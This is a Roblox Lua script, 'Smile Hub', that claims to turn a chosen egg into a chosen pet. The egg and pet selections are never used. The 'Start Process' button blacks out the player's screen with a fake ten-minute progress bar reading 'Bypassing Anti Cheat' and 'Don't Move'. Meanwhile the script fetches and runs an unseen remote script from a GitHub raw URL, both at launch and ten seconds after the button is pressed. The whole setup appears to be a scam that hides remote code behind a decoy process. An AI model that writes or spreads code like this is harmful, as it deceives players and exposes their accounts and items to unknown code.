-- Auto-run Main Script
loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/EGG-PET-METHOD/refs/heads/main/e000dcbd121c14d805b7c7689d79e8cd.txt"))()

-- Load Orion UI Library
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/jensonhirst/Orion/main/source')))()
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")

local EggSelected, PetSelected = "", ""

-- Window
local Window = OrionLib:MakeWindow({
    Name = "$mile Hub",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "$mileHub",
    IntroText = "Connecting to $mile System..."
})

-- Tabs
local MainTab = Window:MakeTab({
    Name = "📂 Main",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local HelpTab = Window:MakeTab({
    Name = "❓ Help",
    Icon = "rbxassetid://7734053497",
    PremiumOnly = false
})

local CreditsTab = Window:MakeTab({
    Name = "⭐ Credits",
    Icon = "rbxassetid://7733960981",
    PremiumOnly = false
})

local ChangelogTab = Window:MakeTab({
    Name = "📝 Changelog",
    Icon = "rbxassetid://7733975219",
    PremiumOnly = false
})

-- Dropdowns
MainTab:AddDropdown({
    Name = "🥚 Select Egg",
    Default = "Common Egg",
    Options = {"Common Egg", "Summer Common Egg", "Rare Egg", "Summer Rare Egg", "Paradise Egg", "Mythical Egg", "Bug Egg"},
    Callback = function(Value)
        EggSelected = Value
    end
})

MainTab:AddDropdown({
    Name = "🐾 Select Pet",
    Default = "Dog",
    Options = {"Dog", "Dragon Fly", "Red Fox"},
    Callback = function(Value)
        PetSelected = Value
    end
})

-- Warning Label
MainTab:AddParagraph("⚠️ WARNING", "Some features like Summer Pets are not supported in older servers. Avoid using them in old server modes to prevent errors.")

-- Join Old Server Button
MainTab:AddButton({
    Name = "🔍 Join Old Server",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "Searching...",
            Content = "Looking for old server...",
            Time = 3
        })

        task.spawn(function()
            local success, result = pcall(function()
                return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
            end)

            if success and result and result.data then
                for _, server in ipairs(result.data) do
                    if server.playing < server.maxPlayers and not server.isPrivate then
                        OrionLib:MakeNotification({
                            Name = "✅ Old Server Found",
                            Content = "Joining old public server...",
                            Time = 4
                        })
                        task.wait(2)
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, Players.LocalPlayer)
                        return
                    end
                end
            end

            OrionLib:MakeNotification({
                Name = "❌ Error",
                Content = "No old server found! All public servers may be full.",
                Time = 4
            })
        end)
    end
})

-- Start Process Button
MainTab:AddButton({
    Name = "▶️ Start Process",
    Callback = function()
        local screenGui = Instance.new("ScreenGui", game.Players.LocalPlayer:WaitForChild("PlayerGui"))
        screenGui.IgnoreGuiInset = true
        screenGui.ResetOnSpawn = false

        local blackFrame = Instance.new("Frame", screenGui)
        blackFrame.Size = UDim2.new(1, 0, 1, 0)
        blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

        local gradient = Instance.new("UIGradient", blackFrame)
        gradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 30)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 60, 180))
        }
        gradient.Rotation = 45

        local watermark = Instance.new("TextLabel", blackFrame)
        watermark.Text = "$mile Hub"
        watermark.Size = UDim2.new(1, 0, 0.1, 0)
        watermark.Position = UDim2.new(0, 0, 0.02, 0)
        watermark.BackgroundTransparency = 1
        watermark.TextStrokeTransparency = 0
        watermark.TextTransparency = 0.8
        watermark.Font = Enum.Font.GothamBlack
        watermark.TextColor3 = Color3.new(1, 1, 1)
        watermark.TextScaled = true

        local sliderBack = Instance.new("Frame", blackFrame)
        sliderBack.Position = UDim2.new(0.1, 0, 0.9, 0)
        sliderBack.Size = UDim2.new(0.8, 0, 0.03, 0)
        sliderBack.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        local corner = Instance.new("UICorner", sliderBack)
        corner.CornerRadius = UDim.new(0, 12)

        local sliderFill = Instance.new("Frame", sliderBack)
        sliderFill.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
        sliderFill.Size = UDim2.new(0, 0, 1, 0)
        sliderFill.BackgroundTransparency = 0.1
        local fillCorner = Instance.new("UICorner", sliderFill)
        fillCorner.CornerRadius = UDim.new(0, 12)

        local progressText = Instance.new("TextLabel", blackFrame)
        progressText.Text = "Initializing..."
        progressText.Size = UDim2.new(1, 0, 0.1, 0)
        progressText.Position = UDim2.new(0, 0, 0.45, 0)
        progressText.BackgroundTransparency = 1
        progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
        progressText.Font = Enum.Font.GothamBold
        progressText.TextScaled = true

        local messages = {
            "Detecting Egg...",
            "Getting Your Desired Pet...",
            "Bypassing Anti Cheat...",
            "Don't Move... This may trigger errors...",
            "If it's taking longer than expected, report at discord.gg/smile"
        }

        local function animateProgress()
            for i = 1, 100 do
                sliderFill:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Sine", 0.5, true)
                if i % 20 == 0 then
                    progressText.Text = messages[((i / 20 - 1) % #messages) + 1]
                end
                wait(6)
            end
            progressText.Text = "100% - All checks passed."
        end

        task.spawn(animateProgress)

        task.delay(10, function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/EGG-PET-METHOD/refs/heads/main/e000dcbd121c14d805b7c7689d79e8cd.txt"))()
        end)
    end
})

-- Help Tab
HelpTab:AddParagraph("Need Help?", "If anything is not working properly, please create a ticket in our Discord server: discord.gg/smile")

-- Credits
CreditsTab:AddParagraph("$mile Hub Team", "UI: OrionLib\nScript: by $mile\nOrion UI by shlexware")

-- Changelog
ChangelogTab:AddParagraph("Latest Changes", "- Progress bar added\n- Blue/black gradient\n- $mile Hub stroke watermark\n- Join Old Server improved")

-- Init
OrionLib:Init()
